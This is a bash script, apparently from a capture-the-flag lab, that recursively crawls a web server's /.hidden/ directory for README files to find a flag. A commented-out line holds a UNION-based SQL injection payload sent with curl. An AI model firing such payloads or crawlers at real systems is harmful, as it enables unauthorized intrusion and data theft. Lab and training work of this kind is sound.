#!/bin/bash

echo input the IP address to inspect \(default IP address 192.168.56.3\):
read ip
# 192.168.56.3

if [ -z ${ip} ];
then
  ip="192.168.56.3"
fi

# echo "${ip}"
inspectUrl="http://"${ip}"/.hidden/"
# echo "${url}"

# response=$(curl -s -G -d "id=1 UNION SELECT title, comment FROM Member_images.list_images" -d "Submit=Submit" "$url")

# dir="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"

# result=$(wget -q --recursive -e robots=off --convert-links $url)
# result=$(find . -type f -name 'README' -exec cat {} \; | grep -Ev 'T|N|D')
# echo "FLAG: ${result}"
# rm -rf $dir/$ip

# wget -q -e robots=off -r -nH --no-parent --reject="index.html*" "$url"
# response=$(eval "find .hidden -name "README" -exec grep -l -e '[0-9]' {} +")
# cat $response
# rm -rf .hidden

regex="href=\"[A-z]*"
# baseUrl="http://10.11.200.193/.hidden/"
found=""

total=20000
current=0

searchFlag() {
    local url=$(echo "$1")

	if [ ! -z "$found" -a "$found" != " " ]; then
		return
	fi

	local response=$(curl -s $url)

	# the File is README
	if [ "$2" == 1 ]; then
		local tmp=$(echo $response | grep -E "[0-9][0-9]+")

		# if Flag found:
		if [ ! -z "$tmp" ]; then
			# found=$(echo $tmp)
			echo ""
			echo "Path: $url"
			echo ""
			echo "$tmp"
			return
		fi
	fi

	# if Flag not found
	local array=($( echo $response | grep -o "$regex" | sed "s/href=\"//" | awk 'NF'))

	for i in "${array[@]}"
	do
		# echo $i
		if [ "$i" != "" -a "$i" != "README" ]; then
			searchFlag "$url$i/"
		elif [ "$i" != "" -a "$i" == "README" ]; then
			searchFlag "$url$i" 1
			current=$((current+1))
			echo -ne "progress : $(((current * 100) / total))%\r"
		fi
	done

}


searchFlag $inspectUrl
# echo ""
# echo "$found"